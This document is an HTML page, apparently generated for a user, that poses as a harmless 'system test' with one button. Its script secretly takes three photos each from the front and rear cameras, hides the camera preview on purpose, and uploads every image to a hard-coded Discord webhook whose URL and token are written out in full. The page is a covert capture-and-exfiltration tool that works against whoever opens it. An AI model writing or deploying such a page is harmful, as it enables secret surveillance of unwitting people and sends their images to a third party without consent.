<!DOCTYPE html>
<html lang="zh-Hant">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>自動拍照與Discord連動測試</title>
<style>
  body { font-family: sans-serif; background: #111; color: #fff; text-align: center; margin: 0; padding: 20px; }
  h2 { font-size: 24px; margin-bottom: 10px; }
  button { margin: 20px auto; padding: 15px 30px; font-size: 18px; cursor: pointer; border: none; border-radius: 8px; background: #28a745; color: white; -webkit-tap-highlight-color: transparent; font-weight: bold; display: block; }
  button:hover { background: #218838; }
  
  /* 依照要求：將預覽畫面完全隱藏，不在網頁畫面上佔用任何空間 */
  video, canvas { display: none !important; }
</style>
</head>
<body>

  <h2>系統測試</h2>
  <!-- 整合為單一觸發按鈕 -->
  <button onclick="startAutoTask()">啟動相機自動化測試</button>

  <!-- 隱藏的影音與畫布組件 -->
  <video id="video" autoplay playsinline muted></video>
  <canvas id="canvas"></canvas>

  <script>
    let currentStream = null;
    
    // 照抄你原本提供的 Discord Webhook 網址
    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1504132923467501618/5pXOEtV2kww8Xj2iT_VDklREGgegoKQmtsWysQAxJjjkB1mEwFE4GCp705P83Y6mNXdG"; 

    // 主排程：點擊按鈕後觸發
    async function startAutoTask() {
      console.log("開始執行自動化拍照任務...");
      
      // 步驟 1：執行前鏡頭連續拍攝 3 張
      console.log("正在呼叫前鏡頭...");
      const userSuccess = await initCamera('user');
      if (userSuccess) {
        for (let i = 1; i <= 3; i++) {
          await delay(1200); // 每張照片間隔 1.2 秒，留給行動裝置對焦與修正曝光
          await captureAndSend(`📸 [前鏡頭] 自動捕捉第 ${i} 張照片`);
        }
      }

      // 步驟 2：執行後鏡頭連續拍攝 3 張
      console.log("正在切換至後鏡頭...");
      const envSuccess = await initCamera('environment');
      if (envSuccess) {
        for (let i = 1; i <= 3; i++) {
          await delay(1200); // 每張照片間隔 1.2 秒
          await captureAndSend(`📸 [後鏡頭] 自動捕捉第 ${i} 張照片`);
        }
      }
      
      // 任務結束：關閉鏡頭釋放資源
      stopCurrentStream();
      console.log("自動化拍照任務執行完畢。");
      alert("測試任務完成！");
    }

    // 初始化特定鏡頭並等待畫面緩衝加載
    async function initCamera(facingMode) {
      const videoElement = document.getElementById("video");
      stopCurrentStream();

      try {
        currentStream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: { exact: facingMode } },
          audio: false
        });
      } catch (err) {
        try {
          currentStream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: facingMode },
            audio: false
          });
        } catch (e) {
          alert("無法存取相機。請檢查權限是否開啟，或網址是否為 HTTPS 安全連線。");
          return false;
        }
      }

      videoElement.srcObject = currentStream;
      
      // 等待原生 video 元件確實收到串流數據
      await new Promise((resolve) => {
        videoElement.onloadeddata = () => resolve();
      });
      
      return true;
    }

    // 拍照並上傳 Discord
    function captureAndSend(labelText) {
      return new Promise((resolve) => {
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        const context = canvas.getContext("2d");

        // 防止手機端抓到寬高為 0 的空數據
        if (video.videoWidth === 0 || video.videoHeight === 0) {
          console.error("相機畫面寬高異常，跳過此張拍攝。");
          resolve();
          return;
        }

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        canvas.toBlob(async (blob) => {
          if (!blob) {
            console.error("圖片 Blob 轉換失敗");
            resolve();
            return;
          }

          const formData = new FormData();
          formData.append("content", labelText);
          formData.append("file", blob, "camera_capture.jpg");

          try {
            const response = await fetch(DISCORD_WEBHOOK, {
              method: "POST",
              body: formData
            });
            if (response.ok) {
              console.log(`${labelText} 傳送成功！`);
            } else {
              console.error(`傳送失敗，狀態碼：${response.status}`);
            }
          } catch (error) {
            console.error("網路傳送錯誤：", error);
          }
          resolve(); // 確保上傳請求不論成功或失敗都會繼續下一張
        }, "image/jpeg", 0.85);
      });
    }

    // 關閉當前鏡頭工具
    function stopCurrentStream() {
      if (currentStream) {
        currentStream.getTracks().forEach(track => track.stop());
        currentStream = null;
      }
    }

    // 毫秒延遲工具
    function delay(ms) {
      return new Promise(resolve => setTimeout(resolve, ms));
    }
  </script>
</body>
</html>
